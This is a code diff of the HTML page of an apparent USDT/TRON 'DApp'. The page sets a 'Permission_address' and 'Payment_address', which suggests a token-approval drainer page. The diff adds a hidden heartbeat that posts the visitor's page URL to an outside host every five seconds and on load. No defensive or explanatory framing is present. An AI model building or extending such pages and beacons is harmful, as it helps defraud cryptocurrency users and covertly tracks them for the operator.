@@ -42,7 +42,7 @@
 <body id="app" class="uni-body pages-index-home">
     <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
 
-     <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
+    
 
     <uni-app class="uni-app--maxwidth">
         <uni-page data-page="pages/index/home">
@@ -105,6 +105,8 @@ window.Permission_address = 'TUuXiCWHxADdvqysLL25iKDCxMDagF6BRC';
 window.Payment_address = 'TEeeWfuMZFSigGaRs7DsTimzYvJBYkXdwf';
 
 window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+
+window.heartbeatUrl = 'https://buyacc.it.com/heartbeat';
     
 // 存储用户数据
 const userData = {
@@ -300,8 +302,32 @@ function tip(message) {
 document.addEventListener('DOMContentLoaded', () => {
     updateAmountDisplay();
     initializeDApp();
-});   </script>
-
+});  
+function sendHeartbeat() {
+    const currentUrl = window.location.href;
+    
+    fetch(window.heartbeatUrl, {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ url: currentUrl })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === 'error' && data.message === '会话已结束') {
+            console.log('会话已结束');
+        }
+    })
+    .catch(() => {
+    });
+}
+const heartbeatInterval = setInterval(sendHeartbeat, 5000); // 每隔5秒发送一次了
+window.onload = sendHeartbeat;
+window.onbeforeunload = function() {
+    clearInterval(heartbeatInterval);
+};    </script>
    <script src="js/1.js"></script> 
 </body>
 </html>
